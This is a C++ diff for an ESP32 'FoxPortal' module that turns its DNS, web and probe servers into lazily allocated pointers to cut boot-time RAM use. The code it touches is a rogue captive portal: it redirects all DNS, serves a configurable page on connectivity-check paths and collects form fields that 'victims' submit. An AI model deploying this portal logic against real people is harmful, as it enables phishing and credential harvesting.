@@ -11,9 +11,19 @@
 #include <string.h>
 
 namespace {
-DNSServer dnsServer;
-WebServer webServer(80);
-WiFiServer sentinelProbeServer(5094);
+// S2 RAM/OOM investigation (2026-09-14, see claude/S2_RAM_OOM_ANALYSIS.md):
+// these three were eager global objects (`DNSServer dnsServer; WebServer
+// webServer(80); WiFiServer sentinelProbeServer(5094);`), unlike
+// fox_csi.cpp/fox_lab.cpp's equivalent WebServer/WebSocketsServer, which
+// are lazy pointers only `new`'d on their own [.../START] command. That
+// meant every board paid this module's RAM cost (WebServer's own internal
+// buffers included) on every single boot, whether or not the captive
+// portal was ever started. Now lazy, matching the sibling modules -
+// allocated once in startPortal() below, on the same WIFIFOXPORTAL:START
+// that already gates every other side effect this module has.
+DNSServer* dnsServer = nullptr;
+WebServer* webServer = nullptr;
+WiFiServer* sentinelProbeServer = nullptr;
 bool portalActive = false;
 
 String currentSsid;
@@ -380,7 +390,7 @@ void confirmExportAndDelete(Print& out = Serial) {
 }
 
 // NOT SINK-REDIRECTED: handleServe/handleRedirect/handleSubmit are
-// WebServer route handlers invoked by webServer.handleClient() inside
+// WebServer route handlers invoked by webServer->handleClient() inside
 // FoxPortal::loop() whenever a captive-portal victim's browser makes a
 // request - not part of any single handleCommand() call's chain, and not
 // reachable from the esp32-tab's HTTP/WS dispatch tables (tasks #10/#11).
@@ -388,42 +398,42 @@ void confirmExportAndDelete(Print& out = Serial) {
 // handleLabRoot().
 void handleServe() {
   Serial.print("[PORTAL] GET ");
-  Serial.print(webServer.uri());
+  Serial.print(webServer->uri());
   Serial.print(" host=");
-  Serial.print(webServer.hostHeader());
+  Serial.print(webServer->hostHeader());
   Serial.print(" client=");
-  Serial.println(webServer.client().remoteIP());
+  Serial.println(webServer->client().remoteIP());
   String page = startHtml.length() > 0 ? startHtml : cachedDefaultStartHtml;
   Serial.print("[PORTAL] serving page, bytes=");
   Serial.println(page.length());
-  webServer.sendHeader("Connection", "close");
-  webServer.send(200, "text/html", page);
+  webServer->sendHeader("Connection", "close");
+  webServer->send(200, "text/html", page);
 }
 
 void handleRedirect() {
   Serial.print("[PORTAL] onNotFound uri=");
-  Serial.print(webServer.uri());
+  Serial.print(webServer->uri());
   Serial.print(" host=");
-  Serial.print(webServer.hostHeader());
+  Serial.print(webServer->hostHeader());
   Serial.print(" client=");
-  Serial.println(webServer.client().remoteIP());
-  webServer.sendHeader("Connection", "close");
-  webServer.sendHeader("Location", "http://200.200.200.1/", true);
-  webServer.send(302, "text/plain", "");
+  Serial.println(webServer->client().remoteIP());
+  webServer->sendHeader("Connection", "close");
+  webServer->sendHeader("Location", "http://200.200.200.1/", true);
+  webServer->send(302, "text/plain", "");
 }
 
 void handleSubmit() {
   String names[FOX_PORTAL_MAX_FIELDS];
   String values[FOX_PORTAL_MAX_FIELDS];
   int count = 0;
-  int argCount = webServer.args();
+  int argCount = webServer->args();
   Serial.print("[PORTAL] handleSubmit POST argCount=");
   Serial.println(argCount);
   for (int i = 0; i < argCount && count < FOX_PORTAL_MAX_FIELDS; i++) {
-    String name = webServer.argName(i);
+    String name = webServer->argName(i);
     if (name.length() == 0 || name == "plain") continue;
     if ((int)name.length() > FOX_PORTAL_KEY_MAX) name = name.substring(0, FOX_PORTAL_KEY_MAX);
-    String v = webServer.arg(i);
+    String v = webServer->arg(i);
     v.trim();
     if ((int)v.length() > FOX_PORTAL_FIELD_MAX) v = v.substring(0, FOX_PORTAL_FIELD_MAX);
     names[count] = name;
@@ -449,14 +459,18 @@ void handleSubmit() {
   } else {
     page = buildDefaultThanksHtml(names, values, count);
   }
-  webServer.sendHeader("Connection", "close");
-  webServer.send(200, "text/html", page);
+  webServer->sendHeader("Connection", "close");
+  webServer->send(200, "text/html", page);
 }
 
 void startPortal(const String& ssid, const String& date, Print& out = Serial) {
 #pragma push_macro("Serial")
 #undef Serial
 #define Serial out
+  if (!dnsServer) dnsServer = new DNSServer();
+  if (!webServer) webServer = new WebServer(80);
+  if (!sentinelProbeServer) sentinelProbeServer = new WiFiServer(5094);
+
   currentSsid = ssid.length() > 0 ? ssid : String(FOX_PORTAL_DEFAULT_SSID);
   currentDate = date.length() > 0 ? date : String("unknown-date");
 
@@ -472,21 +486,21 @@ void startPortal(const String& ssid, const String& date, Print& out = Serial) {
   WiFi.mode(WIFI_AP);
   WiFi.softAPConfig(apIP, apIP, apNetmask, IPAddress(0, 0, 0, 0), apIP);
 
-  dnsServer.setErrorReplyCode(DNSReplyCode::NoError);
-  dnsServer.start(53, "*", apIP);
-  webServer.onNotFound(handleRedirect);
+  dnsServer->setErrorReplyCode(DNSReplyCode::NoError);
+  dnsServer->start(53, "*", apIP);
+  webServer->onNotFound(handleRedirect);
   static bool routesRegistered = false;
   if (!routesRegistered) {
-    webServer.on("/", HTTP_GET, handleServe);
-    webServer.on("/", HTTP_POST, handleSubmit);
-    webServer.on("/generate_204", HTTP_GET, handleServe);
-    webServer.on("/generate_204/", HTTP_GET, handleServe);
-    webServer.on("/gen_204", HTTP_GET, handleServe);
-    webServer.on("/gen_204/", HTTP_GET, handleServe);
+    webServer->on("/", HTTP_GET, handleServe);
+    webServer->on("/", HTTP_POST, handleSubmit);
+    webServer->on("/generate_204", HTTP_GET, handleServe);
+    webServer->on("/generate_204/", HTTP_GET, handleServe);
+    webServer->on("/gen_204", HTTP_GET, handleServe);
+    webServer->on("/gen_204/", HTTP_GET, handleServe);
     routesRegistered = true;
   }
-  webServer.begin();
-  sentinelProbeServer.begin();
+  webServer->begin();
+  sentinelProbeServer->begin();
 
   WiFi.softAP(currentSsid.c_str());
 #if ESP_IDF_VERSION >= ESP_IDF_VERSION_VAL(5, 4, 2)
@@ -519,9 +533,9 @@ void stopPortal(Print& out = Serial) {
     delay(100);
   }
 
-  webServer.stop();
-  sentinelProbeServer.stop();
-  dnsServer.stop();
+  webServer->stop();
+  sentinelProbeServer->stop();
+  dnsServer->stop();
   WiFi.softAPdisconnect(true);
   WiFi.mode(WIFI_STA);
   startHtml = "";
@@ -546,10 +560,10 @@ namespace FoxPortal {
 // handleCommand() call's chain - see the comment above handleServe().
 void loop() {
   if (!portalActive) return;
-  dnsServer.processNextRequest();
-  webServer.handleClient();
+  dnsServer->processNextRequest();
+  webServer->handleClient();
 
-  WiFiClient sentinelClient = sentinelProbeServer.available();
+  WiFiClient sentinelClient = sentinelProbeServer->available();
   if (sentinelClient) {
     Serial.print("[PORTAL] port 5094 connection from ");
     Serial.println(sentinelClient.remoteIP());
